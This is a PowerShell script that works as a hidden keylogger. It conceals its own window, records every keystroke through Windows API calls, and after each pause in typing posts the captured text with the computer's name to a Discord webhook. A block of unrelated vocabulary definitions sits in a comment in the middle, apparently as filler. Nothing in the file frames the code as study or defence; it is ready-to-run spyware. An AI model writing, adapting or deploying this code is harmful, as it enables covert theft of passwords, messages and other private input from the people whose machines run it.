$dc = "$dc"
if ($dc.Length -lt 120){
	$dc = ("https://discord.com/api/webhooks/" + "$dc")
}

$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
$hwnd = (Get-Process -PID $pid).MainWindowHandle
if($hwnd -ne [System.IntPtr]::Zero){
    $Type::ShowWindowAsync($hwnd, 0)
}
else{
    $Host.UI.RawUI.WindowTitle = 'xxx'
    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'xxx' })
    $hwnd = $Proc.MainWindowHandle
    $Type::ShowWindowAsync($hwnd, 0)
}

<#
Ablaze – On fire; brightly burning with intensity.

Banter – Playful, teasing talk between close friends.

Crisp – Firm, dry, and easily breakable texture.

Dapper – Stylish, neat man with elegant appearance.

Elicit – Draw out a response or reaction.

Fathom – Understand something deeply, often abstractly.

Glimpse – Quick, brief look without full details.

Havoc – Widespread destruction; total chaos and disorder.

Imbue – Fill or inspire with certain feelings.

Jovial – Cheerful, friendly, full of good humor.

Keen – Sharp, eager, or intellectually perceptive mind.

Lurk – Remain hidden, waiting to spring forth.

Mirth – Amusement expressed through laughter or cheerfulness.

Nimble – Quick and light in movement or action.

#>

$defs = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$defs = Add-Type -MemberDefinition $defs -Name 'Win32' -Namespace API -PassThru

$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)

While ($true){
  $keyPressed = $false
    try{
      while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
      # Start the loop with 30 ms delay between keystate check
      Start-Sleep -Milliseconds 30
        for ($asc = 8; $asc -le 254; $asc++){
        # Get the key state. (is any key currently pressed)
        $keyst = $defs::GetAsyncKeyState($asc)
          # If a key is pressed
          if ($keyst -eq -32767) {
          # Restart the inactivity timer
          $keyPressed = $true
          $LastKeypressTime.Restart()
          $null = [console]::CapsLock
          # Translate the keycode to a letter
          $vtkey = $defs::MapVirtualKey($asc, 3)
          # Get the keyboard state and create stringbuilder
          $kbst = New-Object Byte[] 256
          $checkkbst = $defs::GetKeyboardState($kbst)
          $logchar = New-Object -TypeName System.Text.StringBuilder
            # Define the key that was pressed          
            if ($defs::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
              # Check for non-character keys
              $LString = $logchar.ToString()
                if ($asc -eq 8) {$LString = "[BACK]"}
                if ($asc -eq 13) {$LString = "[ENT]"}
                if ($asc -eq 27) {$LString = "[ESC]"}
            # Add the key to sending variable
            $send += $LString 
            }
          }
        }
      }
    }
    finally{
      If ($keyPressed) {
      # Send the saved keys to a webhook
      $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
      $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
      $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
      Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
      #Remove log file and reset inactivity check 
      $send = ""
      $keyPressed = $false
      }
    }
  # reset stopwatch before restarting the loop
  $LastKeypressTime.Restart()
  Start-Sleep -Milliseconds 10
}
